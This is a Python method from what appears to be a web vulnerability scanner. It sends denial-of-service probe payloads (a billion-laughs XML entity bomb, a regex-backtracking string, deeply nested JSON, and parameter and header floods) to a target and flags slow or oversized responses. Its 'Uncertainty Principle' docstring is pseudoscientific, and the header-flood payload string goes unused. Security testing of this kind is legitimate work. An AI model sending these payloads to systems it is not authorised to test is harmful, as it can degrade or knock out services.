    def test_zeroday_wave3_uncertainty_principle_dos(self):
        """Wave3 #25 — Uncertainty Principle DoS.

        Can't simultaneously know response time and size — perturbations
        that affect one reveal DoS amplifiers.
        """
        if not self.deep: return
        self._print("[*]", "Wave3: Uncertainty Principle DoS...", "INFO")
        # Send payload that should be processed quickly
        # If response is large + slow → DoS amplifier
        amplifier_payloads = [
            ("regex backtrack", "a" * 30 + "!" * 30),
            ("xml billion laughs", '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>'),
            ("json deep", "[" * 1000 + "]" * 1000),
            ("long string", "a" * 100000),
            ("param flood", "&".join(f"x{i}=a" for i in range(1000))),
            ("header flood", "&".join(f"X-{i}:a" for i in range(1000))),
        ]
        base_r = self._get(self.target)
        base_time = base_r.elapsed.total_seconds() if base_r else 0
        base_size = len(base_r.text or "") if base_r else 0
        for label, payload in amplifier_payloads:
            try:
                if label.startswith("header"):
                    headers = {f"X-{i}": "a" for i in range(50)}
                    r = self._get(self.target, headers=headers, timeout=10)
                else:
                    r = self._get(self.target, params={"q": payload}, timeout=10)
                if not r: continue
                t = r.elapsed.total_seconds()
                s = len(r.text or "")
                # DoS amplifier: response much larger or slower
                if (t > base_time * 5 and t > 1.0) or (s > base_size * 10):
                    self._add_vuln(f"Wave3 DoS Amplifier: {label}",
                                    "HIGH", self.target,
                                    f"Payload {label} amplified response "
                                    f"(time={t:.2f}s vs {base_time:.2f}s, "
                                    f"size={s} vs {base_size})",
                                    label=label, time=t, size=s)
            except Exception: pass

